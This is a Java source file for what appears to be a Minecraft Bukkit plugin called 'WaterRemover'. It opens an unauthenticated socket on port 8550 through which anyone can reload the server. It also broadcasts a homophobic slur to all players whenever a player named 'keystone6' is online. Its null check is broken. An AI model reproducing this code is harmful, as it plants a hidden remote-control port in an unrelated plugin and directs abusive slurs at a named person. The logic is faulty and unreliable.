package com.danielhmoore.WaterRemover;

import java.io.*;
import java.net.*;
import java.util.logging.Logger;

import org.bukkit.Server;

public class socketServer implements Runnable {
	//public static void main(String[] args)
	Logger log;
	public socketServer ()
	{
		log = Logger.getLogger("Minecraft");
	}

	@Override
	public void run() {
		try {
			ServerSocket socket = new ServerSocket(8550);
			Socket insocket;
			
			while (true) {
				insocket = socket.accept();
				
				BufferedReader in = new BufferedReader(new InputStreamReader(insocket.getInputStream()));
				
				PrintWriter out = new PrintWriter(insocket.getOutputStream(), true);
				
				Server s = org.bukkit.Bukkit.getServer();
				
				String instring = in.readLine();
				if (!instring.isEmpty() || instring != null) {
					if (instring.equals("reload")) {
						org.bukkit.Bukkit.getServer().reload();
						log.info("reloading bukkit");
					} else if (instring.equals("players")) {
						log.info("players");
						for(int i = 0; i < s.getOnlinePlayers().length; i++) {
							log.info(s.getOnlinePlayers()[i].getDisplayName());
							if (s.getOnlinePlayers()[i].getDisplayName().equalsIgnoreCase("keystone6")) {
								s.broadcastMessage("You're a fag");
							}
						}
					}
					log.info(instring);
					out.println("The server got this: " + instring);
				}
				Thread.sleep(100);
				insocket.close();
			}

		}
		catch (Exception e) {
			
			log.info(e.getMessage());
		}
	}
}
